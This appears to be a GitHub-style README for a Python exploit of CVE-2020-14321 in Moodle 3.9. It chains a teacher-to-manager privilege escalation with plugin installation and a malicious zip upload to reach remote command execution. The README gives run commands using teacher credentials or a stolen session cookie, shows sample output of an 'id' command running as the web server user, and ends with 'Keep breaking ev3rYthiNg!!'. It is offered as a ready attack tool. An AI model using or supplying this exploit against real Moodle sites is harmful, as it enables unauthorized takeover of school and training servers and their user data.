Python script to exploit [CVE-2020-14321](https://moodle.org/mod/forum/discuss.php?d=407393) - **Moodle 3.9** 

Course enrolments allowed privilege escalation from teacher role into manager role to RCE.

* Teachers of a course were able to assign themselves the manager role within that course.

Payload extracted from: https://github.com/HoangKien1020/CVE-2020-14321

## Usage

If you have valid teacher credentials (InReaLife this has not been tested enough, or maybe yes, I don't know :P):

```bash
❭ python3 CVE-2020-14321_RCE.py http://moodle.site.com/moodle -u lanz -p 'Lanz123$!'
```

If you have a valid teacher cookie (**101% tested**):

```bash
❱ python3 CVE-2020-14321_RCE.py http://moodle.site.com/moodle --cookie th3f7k1ngggk00ci30ft3ach3r
```

...

```bash
❱ python3 CVE-2020-14321_RCE.py http://moodle.site.com/moodle --cookie th3f7k1ngggk00ci30ft3ach3r -c id
 __     __     __   __  __   __              __  __     
/  \  /|_  __   _) /  \  _) /  \ __  /| |__|  _)  _) /| 
\__ \/ |__     /__ \__/ /__ \__/      |    | __) /__  | • by lanz

Moodle 3.9 - Remote Command Execution (Authenticated as teacher)
Course enrolments allowed privilege escalation from teacher role into manager role to RCE
                                                        
[+] Login on site: MoodleSession:th3f7k1ngggk00ci30ft3ach3r ✓
[+] Updating roles to move on manager accout: ✓
[+] Updating rol manager to enable install plugins: ✓
[+] Uploading malicious .zip file: ✓
[+] Executing id: ✓

uid=80(www) gid=80(www) groups=80(www)
```

Keep breaking ev3rYthiNg!!
